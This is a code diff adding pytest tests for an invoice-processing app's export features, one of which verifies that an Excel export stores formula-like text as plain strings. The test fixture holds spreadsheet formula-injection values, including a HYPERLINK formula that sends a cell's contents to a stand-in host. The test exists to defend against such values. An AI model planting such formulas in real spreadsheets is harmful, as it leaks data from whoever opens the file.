@@ -462,3 +462,30 @@ def test_an_invoice_upload_over_the_size_limit_is_not_saved(store, monkeypatch):
     job.wait(30)
     assert "larger than" in json.dumps(job.snapshot())
     assert not (process.invoice_dir(store) / "big.pdf").exists()
+
+
+# --- 9. The CSV is for the ERP loader; the .xlsx is the one to open in Excel -------------------------------------
+
+
+@pytest.mark.parametrize("fmt", ["csv", "custom"])
+def test_the_exports_page_says_the_csv_is_for_the_erp_loader_and_excel_takes_the_xlsx(store, fmt):
+    app = create_app(web_settings(), store, start_reader=False)
+    page = local(app).get(f"/exports?fmt={fmt}").text
+    assert "for the ERP loader" in page and "to look at it in Excel, use the .xlsx export" in page
+
+
+def test_the_xlsx_export_keeps_formula_like_text_as_text(store):
+    import io
+
+    from openpyxl import load_workbook
+
+    from ap_coder.erp import exports
+
+    invoice = store.get_invoice(store.list_invoices(APPROVED)[0]["id"])
+    final = dict(invoice["final_output"], vendor_name='=HYPERLINK("http://x.example/?"&A1,"Click")',
+                 invoice_number="+A-100", po_number="@SUM(A1)")  # fmt: skip
+    workbook = load_workbook(io.BytesIO(exports.build_xlsx([dict(invoice, final_output=final)])))
+    texts = [c for ws in workbook for row in ws.iter_rows() for c in row if isinstance(c.value, str)]
+    risky = [c for c in texts if c.value.startswith(("=", "+", "-", "@"))]
+    assert {c.value for c in risky} >= {final["vendor_name"], "+A-100", "@SUM(A1)"}
+    assert all(c.data_type == "s" for c in risky)
